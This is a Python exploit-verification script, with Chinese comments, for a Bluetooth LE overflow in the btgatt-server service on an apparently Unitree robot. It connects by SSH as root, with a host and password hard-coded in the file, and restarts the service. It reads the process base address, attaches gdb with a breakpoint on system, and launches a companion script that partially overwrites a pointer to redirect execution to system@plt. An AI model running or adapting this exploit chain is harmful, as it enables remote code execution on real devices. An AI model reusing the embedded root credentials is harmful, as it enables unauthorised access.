#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""L+0x18 劫持 一键验证: 重启btgatt -> 挂gdb(b system) -> BLE溢出 -> 收集证据
用法: python verify_l_hijack.py [pc|sys]
  pc  : 2字节覆盖 0xbeef, gdb 观察 PC=base+0x1beef 附近执行/崩溃
  sys : 3字节覆盖 system@plt (byte2自动从maps读取), gdb 命中 system 断点即实证
"""
import paramiko, time, sys, subprocess, re

HOST=("192.168.8.154",22022,"root","sigvoid1234")
def ssh(cmd,t=30):
    c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(HOST[0],port=HOST[1],username=HOST[2],password=<密码_01>,timeout=15,
              allow_agent=False,look_for_keys=False,banner_timeout=25,auth_timeout=25)
    _,o,e=c.exec_command(cmd,timeout=t); r=o.read().decode(errors='replace'); c.close(); return r

mode=sys.argv[1] if len(sys.argv)>1 else "sys"
delay=sys.argv[2] if len(sys.argv)>2 else "0.5"
ssh("pkill -9 gdb; pkill -9 -f btgatt-server; sleep 1")
ssh("cd /unitree/module/network_manager/upper_bluetooth && (nohup ./btgatt-server -i hci0 -r -v >/tmp/bt.log 2>&1 </dev/null &); sleep 2")
pid=ssh("pgrep -f btgatt-server | head -1").strip()
base=int(ssh(f"grep btgatt-server /proc/{pid}/maps | head -1").split('-')[0],16)
b2=(base>>16)&0xff
print(f"[*] pid={pid} base=0x{base:x} byte2=0x{b2:x}",flush=True)
if mode=="pc":
    gdbcmd=(f"gdb -batch -p {pid} -ex 'set pagination off' -ex continue"
            " -ex 'echo \\n===CRASH===\\n' -ex 'info registers pc x0 x1 x2 x30'"
            " -ex 'x/2i $pc' -ex 'bt' -ex detach > /tmp/gdb_v.log 2>&1 </dev/null &")
else:
    gdbcmd=(f"gdb -batch -p {pid} -ex 'set pagination off' -ex 'b system' -ex continue"
            " -ex 'echo \\n===HIT SYSTEM===\\n' -ex 'info registers pc x0 x1 x2 x30'"
            " -ex 'x/s $x0' -ex 'bt 3'"
            " -ex 'echo \\n===STOP DETAIL===\\n' -ex 'p/x $_siginfo._sifields._sigfault.si_addr'"
            " -ex 'x/6i $pc-8' -ex 'info registers x0 x1 x2 x3 x19 x20 x21 x22'"
            f" -ex 'x/12gx 0x{base+0x2e5e8:x}' -ex 'x/8gx 0x{base+0x2e000:x}'"
            " -ex detach > /tmp/gdb_v.log 2>&1 </dev/null &")
ssh("nohup "+gdbcmd); time.sleep(3)
print("[*] gdb armed:", ssh("pgrep -f 'gdb -batch' | head -1").strip(),flush=True)

args=["python","ble_l_hijack.py",mode,"--delay",delay]
if mode=="sys": args+=["--b2",hex(b2)]
r=subprocess.run(args,capture_output=True,text=True,timeout=280)
print(r.stdout[-2500:]); print(r.stderr[-400:],file=sys.stderr)
time.sleep(3)
print("=== gdb_v.log ===")
print(ssh("cat /tmp/gdb_v.log"))
pid2=ssh("pgrep -f btgatt-server | head -1").strip()
print("[*] btgatt alive:", pid2)
def rd(addr,n):
    return ssh(f"dd if=/proc/{pid2}/mem bs=1 skip={addr} count={n} 2>/dev/null | xxd -p | tr -d '\\n'")
base2=int(ssh(f"grep btgatt-server /proc/{pid2}/maps | head -1").split('-')[0],16)
print(f"[*] L+0x18 = {rd(base2+0x2ea10,8)}")
print(f"[*] accum  = {int.from_bytes(bytes.fromhex(rd(base2+0x2e1e2,2)),'little')}")
print("[*] current_idx 日志数:", ssh("sed 's/\\x1b\\[[0-9;]*m//g' /tmp/bt.log | grep -c current_idx").strip())
